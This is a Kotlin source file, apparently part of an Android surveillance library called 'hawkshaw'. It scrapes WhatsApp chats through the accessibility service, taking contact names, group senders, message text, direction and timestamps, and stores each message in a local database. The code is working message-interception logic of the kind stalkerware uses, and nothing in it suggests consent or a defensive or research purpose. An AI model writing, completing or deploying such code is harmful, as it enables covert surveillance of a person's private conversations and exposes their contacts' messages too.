package com.hawkshaw.library.features.accessibility.socialmedia

import android.graphics.Rect
import android.os.Build
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import com.hawkshaw.library.datalayer.models.PackageName
import com.hawkshaw.library.datalayer.room.AppDatabaseKt
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.findFirst // Import the extension function
import com.hawkshaw.library.ktextensions.getDp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.time.DayOfWeek
import java.time.format.DateTimeFormatter
import java.util.Calendar
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.regex.Pattern

/**
 * Object responsible for extracting WhatsApp messages from accessibility events
 */
object Whatsapp {
    private const val WHATSAPP_ID = "com.whatsapp:id"
    private val coroutineScope = CoroutineScope(Dispatchers.IO)

    /**
     * Extracts and processes WhatsApp messages from the provided accessibility node
     *
     * @param node The accessibility node containing WhatsApp message information
     * @param executor The executor service for handling background tasks (Note: executor is not directly used here, coroutineScope is)
     */
    @RequiresApi(Build.VERSION_CODES.O)
    fun extractMessages(node: AccessibilityNodeInfo, executor: ExecutorService) { // ExecutorService parameter is unused in this method currently.
        // FIXED: Call findFirst as an extension function on 'node'
        val contactNameNode = node.findFirst("$WHATSAPP_ID/conversation_contact_name")
        val contactName = contactNameNode?.text ?: return

        // FIXED: Call findFirst as an extension function on 'node'
        val statusNode = node.findFirst("$WHATSAPP_ID/conversation_contact_status")
        val status = statusNode?.text?.toString()

        // FIXED: Call findFirst as an extension function on 'node'
        val listNode = node.findFirst("android:id/list") ?: return
        val childCount = listNode.childCount

        var globalTimestamp: Long = System.currentTimeMillis()
        var sender: String? = null

        for (i in 0 until childCount) {
            val child = listNode.getChild(i) ?: continue

            // Check for group sender name
            // FIXED: Call findFirst as an extension function on 'child'
            val nameInGroupNode = child.findFirst("$WHATSAPP_ID/name_in_group_tv")
            nameInGroupNode?.text?.toString()?.let { s -> // Changed 'it' to 's' for clarity, though 'it' would also work
                sender = s
            }

            // Check for date divider (global timestamp)
            // FIXED: Call findFirst as an extension function on 'child'
            val dateDividerNode = child.findFirst("$WHATSAPP_ID/conversation_row_date_divider")
            dateDividerNode?.text?.toString()?.let { dateText ->
                extractGlobalTimestamp(dateText)?.let {
                    globalTimestamp = it
                }
            }

            // Check for message text
            // FIXED: Call findFirst as an extension function on 'child'
            val messageTextNode = child.findFirst("$WHATSAPP_ID/message_text")
            val messageText = messageTextNode?.text ?: continue

            // Determine message type based on position
            val rect = Rect()
            messageTextNode.getBoundsInScreen(rect)
            val messageType = if (getDp(rect.left) < 65) {
                SocialMediaEntity.Type.Received
            } else {
                SocialMediaEntity.Type.Sent
            }

            // Extract timestamp from date node
            // FIXED: Call findFirst as an extension function on 'child'
            val dateNode = child.findFirst("$WHATSAPP_ID/date")
            // Removed redundant replace, assuming the original intent was space normalization if needed.
            // If any specific character replacement is needed, it should be explicitly defined.
            val dateText = dateNode?.text?.toString()

            // Create a unique identifier for this message
            val identifier = "$contactName-$messageText-$dateText-${PackageName.WHATSAPP}"

            // Create and save entity
            val entity = SocialMediaEntity(
                type = messageType,
                packageName = PackageName.WHATSAPP.name,
                sender = sender,
                message = messageText.toString(),
                // FIXED: Ensure Instagram.extractTimestamp is called with non-null dateText
                timestamp = Instagram.extractTimestamp(dateText, globalTimestamp) ?: globalTimestamp
            )

            coroutineScope.launch {
                AppDatabaseKt.db.socialMediaDao().insert(entity)
            }
        }
    }

    /**
     * Extracts global timestamp from various date formats in WhatsApp
     *
     * @param input The string containing date information (e.g., "Today", "Yesterday", "Monday", "December 25, 2023").
     * @return The extracted timestamp in milliseconds, or null if no valid format found.
     */
    @RequiresApi(Build.VERSION_CODES.O)
    private fun extractGlobalTimestamp(input: String?): Long? {
        if (input.isNullOrEmpty()) {
            return null
        }

        val fullDatePattern = Pattern.compile("[A-Za-z]+ (0?[1-9]|[12][0-9]|3[01]), \\d{4}$") // Example: "December 25, 2023"
        val todayPattern = Pattern.compile("Today")
        val yesterdayPattern = Pattern.compile("Yesterday")
        val weekdayPattern = Pattern.compile("[A-Za-z]{3,}") // Matches full weekday names or abbreviations

        val calendar = Calendar.getInstance().apply {
            set(Calendar.HOUR_OF_DAY, 0)
            set(Calendar.MINUTE, 0)
            set(Calendar.SECOND, 0)
            set(Calendar.MILLISECOND, 0)
        }

        return when {
            fullDatePattern.matcher(input).matches() -> {
                val dateFormat = SimpleDateFormat("MMMM dd, yyyy", Locale.getDefault())
                dateFormat.parse(input)?.time
            }

            todayPattern.matcher(input).matches() -> {
                calendar.timeInMillis
            }

            yesterdayPattern.matcher(input).matches() -> {
                calendar.add(Calendar.DAY_OF_MONTH, -1)
                calendar.timeInMillis
            }

            weekdayPattern.matcher(input).matches() -> {
                // This block aims to parse a weekday string (e.g., "Monday", "Mon")
                // and calculate the timestamp for that day in the current week or previous week.
                try {
                    // Parse the input string to a DayOfWeek enum
                    val dayInPattern = DayOfWeek.from(
                        DateTimeFormatter.ofPattern("EEEE", Locale.getDefault()).parse(input)
                    ).value // ISO day of week (1-7, Monday=1)

                    var currentDayOfWeek = calendar.get(Calendar.DAY_OF_WEEK) // Calendar.DAY_OF_WEEK (1-7, Sunday=1)

                    // Convert ISO day of week to Calendar.DAY_OF_WEEK format
                    val dayInPatternCalFormat = (dayInPattern % 7) + 1 // Convert Monday=1 to Monday=2, Sunday=7 to Sunday=1 (after mod 7 it becomes 0, then +1)

                    var diff = currentDayOfWeek - dayInPatternCalFormat

                    if (diff < 0) { // If the target day is later in the current week, it means it was in the *previous* week
                        diff += 7
                    }
                    // 'diff' now represents how many days ago the target weekday was.
                    calendar.add(Calendar.DAY_OF_YEAR, -diff)
                    calendar.timeInMillis
                } catch (e: Exception) {
                    // Log error if date parsing fails for weekday
                    // Logger.e("Whatsapp", "Error parsing weekday: $input", e, false, 12, null)
                    null
                }
            }

            else -> null
        }
    }
}
